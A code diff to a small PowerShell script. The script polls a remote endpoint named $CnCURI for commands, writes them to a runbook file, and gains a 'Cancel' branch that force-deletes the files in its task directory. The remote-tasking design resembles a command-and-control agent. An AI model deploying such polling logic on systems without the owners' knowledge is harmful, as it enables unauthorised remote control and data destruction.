@@ -1,7 +1,7 @@
 $script:name=($MyInvocation.MyCommand.Name).Trim('.ps1')
 
 function CheckWebTasks() {
-	if (!(test-path $TaskDir)) {mkdir  $TaskDir}
+	if (!(test-path $TaskDir)) {mkdir $TaskDir}
 	#Check for published tasks
 	$WebCommand=(Invoke-WebRequest -Method POST -Headers $head -URI $CnCURI).content
 
@@ -16,7 +16,9 @@ function CheckWebTasks() {
 			}
 
 	#Create task runbook
-	
+	if ($CmdList[0] -eq 'Cancel') {
+		Remove-Item "$TaskDir\*.*" -force -verbose
+		}
 	$CmdList | out-file $runbook
 	$hash=(Get-FileHash -Algorithm sha1 $runbook).hash
 	return $hash
